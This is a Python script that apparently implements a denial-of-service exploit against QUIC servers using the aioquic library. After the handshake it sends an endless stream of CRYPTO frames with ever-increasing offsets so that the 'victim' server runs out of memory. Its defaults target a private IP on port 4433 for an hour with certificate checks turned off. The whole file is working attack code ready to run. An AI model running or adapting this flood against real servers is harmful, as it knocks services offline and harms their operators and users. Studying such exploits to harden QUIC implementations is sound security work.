import argparse
import asyncio
import logging
import ssl
from typing import Optional

from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import HandshakeCompleted, QuicEvent
from aioquic.quic.packet import PACKET_TYPE_ONE_RTT, QuicFrameType
from aioquic.quic.packet_builder import QuicPacketBuilder
from aioquic.tls import Epoch
from aioquic.buffer import size_uint_var

logger = logging.getLogger("attacker")

class AttackerProtocol(QuicConnectionProtocol):
    """
    Custom protocol, called "AttackerProtocol", which waits the handshake to start
    flooding the server with CRYPTO packets. Those CRYPTO packets have an increasing offset,
    so that the server will exhaust it's own memory.
    """
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._attack_task: Optional[asyncio.Task] = None

    def quic_event_received(self, event: QuicEvent) -> None:
        """
        In this function we wait for the completion of the QUIC handshake. After that,
        the attack starts.
        """
        if isinstance(event, HandshakeCompleted) and self._attack_task is None:
            logger.info("Handshake completed. The attack is starting :D...")
            self._attack_task = asyncio.create_task(self._attack_loop())

    def connection_lost(self, exc: Optional[Exception]) -> None:
        """
        Clean _attack_task as soon as you loose the connection.
        """
        if self._attack_task:
            self._attack_task.cancel()
            self._attack_task = None
        logger.info("Connection lost.")
        super().connection_lost(exc)

    async def _attack_loop(self) -> None:
        """
        The exploit. Here the packets are built and then sent to the victim.
        """

        # Get the main QUIC connection state object. It holds all session parameters.
        conn = self._quic
        # Get the cryptographic keys for the 1-RTT (post-handshake) data exchange.
        crypto = conn._cryptos[Epoch.ONE_RTT]
        
        addr = conn._network_paths[0].addr

        # Exploit parameters: the 'attack_offset" will create the "hole", forcing memory allocation
        attack_offset = 0x1000
        attack_length = 0x200
        frame_data = b'\xde\xad\xbe\xef' * (attack_length // 4)

        logger.info(
            f"Starting DoS with CRYPTO frame"
            f" (starting offset: {hex(attack_offset)}, length: {hex(attack_length)})"
        )

        while True:
            try:
                # The QuicPacketBuilder just assembles the raw bytes of a QUIC packet,
                # we build the packet using the standard parameters 
                # already initialized of the connection
                builder = QuicPacketBuilder(
                    host_cid=conn.host_cid,
                    is_client=conn._is_client,
                    max_datagram_size=conn._max_datagram_size,
                    packet_number=conn._packet_number,
                    peer_cid=conn._peer_cid.cid,
                    peer_token=b'',
                    version=conn._version,
                )
                # Create a new QUIC packet, which is the main container sent over UDP.
                # This packet will hold multiple frames.
                builder.start_packet(PACKET_TYPE_ONE_RTT, crypto)
                
                # Now build the frame (inside the packet). We follow the same format
                # described in RFC9000
                capacity = (
                    1
                    + size_uint_var(attack_offset)
                    + size_uint_var(attack_length)
                    + attack_length
                )
                frame_buf = builder.start_frame(QuicFrameType.CRYPTO, capacity=capacity)
                frame_buf.push_uint_var(attack_offset)
                frame_buf.push_uint_var(attack_length)
                frame_buf.push_bytes(frame_data)

                # Finalize the packet building. This returns a list of datagrams.
                datagrams, _ = builder.flush()
                
                # Send the raw datagram (UDP payload) to the victim's address
                for datagram in datagrams:
                    self._transport.sendto(datagram, addr)

                # Increase the offset
                attack_offset += 0x1000

                await asyncio.sleep(0)

            except asyncio.CancelledError:
                logger.info("Loop broken")
                break
            except Exception as e:
                logger.error(f"Error in the attack: {e}")
                break

async def main(
    host: str,
    port: int,
    configuration: QuicConfiguration,
    duration: int,
) -> None:
    logger.info(f"Trying to connect to {host}:{port}")
    
    async with connect(
        host,
        port,
        configuration=configuration,
        create_protocol=AttackerProtocol,
    ) as client:
        client = client # type: AttackerProtocol
        logger.info(f"Attacking. I'll attack for {duration} seconds.")
        try:
            await asyncio.sleep(duration)
        except asyncio.CancelledError:
            pass
        finally:
            logger.info("Time finished for the attack. Closing the connection.")
            client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", 
                        type=str,
                        default="192.168.214.128", 
                        help="Victim's IP address")
    parser.add_argument("--port", 
                        type=int,
                        default=4433, 
                        help="Victim's port")
    parser.add_argument(
        "--duration", type=int, default=3600, help="Time in seconds to carry out the attack"
    )
    parser.add_argument(
        "--insecure", action="store_true", default=True,help="Decide to don't validate the server's certificate"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Make the logs verbose."
    )
    args = parser.parse_args()

    logging.basicConfig(
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )

    # Setup QUIC connection
    configuration = QuicConfiguration(is_client=True, alpn_protocols=["h3"])
    if args.insecure:
        configuration.verify_mode = ssl.CERT_NONE

    # Launch the malicious client
    try:
        asyncio.run(
            main(
                host=args.host,
                port=args.port,
                configuration=configuration,
                duration=args.duration,
            )
        )
    except KeyboardInterrupt:
        logger.info("Interrupted by the user.")